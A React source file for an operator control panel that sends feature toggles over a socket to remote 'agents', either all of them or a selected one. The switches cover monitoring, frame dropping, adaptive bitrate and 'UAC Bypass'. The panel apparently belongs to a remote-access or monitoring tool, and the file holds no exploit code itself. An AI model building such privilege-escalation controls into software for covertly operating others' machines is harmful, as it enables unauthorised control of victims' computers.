import { useEffect, useState } from "react";
import { useSocket } from "./SocketProvider";
import { Card, CardContent, CardHeader, CardTitle } from "./ui/card";
import { Badge } from "./ui/badge";
import { Switch } from "./ui/switch";
import { Label } from "./ui/label";
import { Button } from "./ui/button";
import { Activity, Settings, Users } from "lucide-react";

export default function ToggleControlPanel() {
  const { socket, selectedAgent } = useSocket() as { socket: any; selectedAgent: string | null };
  const [globalMonitoring, setGlobalMonitoring] = useState(true);
  const [globalFrameDropping, setGlobalFrameDropping] = useState(false);
  const [globalAdaptiveBitrate, setGlobalAdaptiveBitrate] = useState(true);
  const [globalUacBypass, setGlobalUacBypass] = useState(false);
  const [agentMonitoring, setAgentMonitoring] = useState(true);
  const [agentFrameDropping, setAgentFrameDropping] = useState(false);
  const [agentAdaptiveBitrate, setAgentAdaptiveBitrate] = useState(true);
  const [agentUacBypass, setAgentUacBypass] = useState(false);

  const emitToggle = (feature: string, enabled: boolean, agentId?: string | null) => {
    if (!socket) return;
    const payload: any = { feature, enabled };
    if (agentId) payload.agent_id = agentId;
    socket.emit("operator_toggle_feature", payload);
  };

  useEffect(() => {
    if (!socket) return;
    const handler = (data: any) => {};
    socket.on("feature_toggle", handler);
    return () => {
      socket.off("feature_toggle", handler);
    };
  }, [socket]);

  return (
    <Card>
      <CardHeader>
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Settings className="h-4 w-4" />
            <CardTitle className="text-sm">Feature Toggles</CardTitle>
          </div>
          <Badge variant="outline">{selectedAgent ? selectedAgent.slice(0, 8) : "All agents"}</Badge>
        </div>
      </CardHeader>
      <CardContent className="space-y-6">
        <div className="space-y-2">
          <div className="flex items-center gap-2 text-xs text-muted-foreground">
            <Users className="h-3 w-3" />
            <span>Global Controls</span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="flex items-center justify-between">
              <Label htmlFor="global-monitoring">Monitoring Enabled</Label>
              <Switch
                id="global-monitoring"
                checked={globalMonitoring}
                onCheckedChange={(checked) => {
                  setGlobalMonitoring(checked);
                  emitToggle("monitoring", checked, null);
                }}
              />
            </div>
            <div className="flex items-center justify-between">
              <Label htmlFor="global-framedrop">Frame Dropping</Label>
              <Switch
                id="global-framedrop"
                checked={globalFrameDropping}
                onCheckedChange={(checked) => {
                  setGlobalFrameDropping(checked);
                  emitToggle("frame_dropping", checked, null);
                }}
              />
            </div>
            <div className="flex items-center justify-between">
              <Label htmlFor="global-abitrate">Adaptive Bitrate</Label>
              <Switch
                id="global-abitrate"
                checked={globalAdaptiveBitrate}
                onCheckedChange={(checked) => {
                  setGlobalAdaptiveBitrate(checked);
                  emitToggle("adaptive_bitrate", checked, null);
                }}
              />
            </div>
            <div className="flex items-center justify-between">
              <Label htmlFor="global-uacbypass">UAC Bypass</Label>
              <Switch
                id="global-uacbypass"
                checked={globalUacBypass}
                onCheckedChange={(checked) => {
                  setGlobalUacBypass(checked);
                  emitToggle("uac_bypass", checked, null);
                }}
              />
            </div>
          </div>
        </div>

        <div className="space-y-2">
          <div className="flex items-center gap-2 text-xs text-muted-foreground">
            <Activity className="h-3 w-3" />
            <span>Selected Agent Controls</span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="flex items-center justify-between">
              <Label htmlFor="agent-monitoring">Monitoring Enabled</Label>
              <Switch
                id="agent-monitoring"
                disabled={!selectedAgent}
                checked={agentMonitoring}
                onCheckedChange={(checked) => {
                  setAgentMonitoring(checked);
                  emitToggle("monitoring", checked, selectedAgent);
                }}
              />
            </div>
            <div className="flex items-center justify-between">
              <Label htmlFor="agent-framedrop">Frame Dropping</Label>
              <Switch
                id="agent-framedrop"
                disabled={!selectedAgent}
                checked={agentFrameDropping}
                onCheckedChange={(checked) => {
                  setAgentFrameDropping(checked);
                  emitToggle("frame_dropping", checked, selectedAgent);
                }}
              />
            </div>
            <div className="flex items-center justify-between">
              <Label htmlFor="agent-abitrate">Adaptive Bitrate</Label>
              <Switch
                id="agent-abitrate"
                disabled={!selectedAgent}
                checked={agentAdaptiveBitrate}
                onCheckedChange={(checked) => {
                  setAgentAdaptiveBitrate(checked);
                  emitToggle("adaptive_bitrate", checked, selectedAgent);
                }}
              />
            </div>
            <div className="flex items-center justify-between">
              <Label htmlFor="agent-uacbypass">UAC Bypass</Label>
              <Switch
                id="agent-uacbypass"
                disabled={!selectedAgent}
                checked={agentUacBypass}
                onCheckedChange={(checked) => {
                  setAgentUacBypass(checked);
                  emitToggle("uac_bypass", checked, selectedAgent);
                }}
              />
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Button
              size="sm"
              variant="outline"
              disabled={!selectedAgent}
              onClick={() => {
                emitToggle("monitoring", agentMonitoring, selectedAgent);
                emitToggle("frame_dropping", agentFrameDropping, selectedAgent);
                emitToggle("adaptive_bitrate", agentAdaptiveBitrate, selectedAgent);
                emitToggle("uac_bypass", agentUacBypass, selectedAgent);
              }}
            >
              Apply To Agent
            </Button>
          </div>
        </div>
      </CardContent>
    </Card>
  );
}
